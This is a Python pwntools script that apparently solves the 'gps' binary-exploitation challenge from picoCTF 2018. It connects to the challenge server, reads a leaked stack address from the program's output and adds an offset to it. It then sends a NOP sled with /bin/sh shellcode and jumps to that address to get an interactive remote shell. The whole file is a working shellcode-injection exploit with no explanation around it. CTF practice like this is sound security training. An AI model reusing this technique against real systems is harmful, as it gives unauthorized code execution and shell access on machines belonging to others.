#coding=utf-8
from pwn import *
import re

#context.log_level = 'debug'
#context(arch='amd64', os='linux', bits = '64')
context.binary = './gps'

debug = 0
if not debug:
  r = remote('2018shell.picoctf.com', 49351)
else:
  r = process('./gps')

nop = asm(shellcraft.nop())
shell = asm(shellcraft.sh())
#shell = asm(pwnlib.shellcraft.amd64.linux.sh())
payload = nop * (0x1000 - len(shell) - 3) + shell

addr = int(r.recvuntil('> ').split('\n')[9].split(': ')[1][2:], 16)
addr += 2000
log.info('addr: {}'.format(addr))
r.sendline(payload)

r.sendlineafter('> ', hex(addr)[2:])
r.interactive()
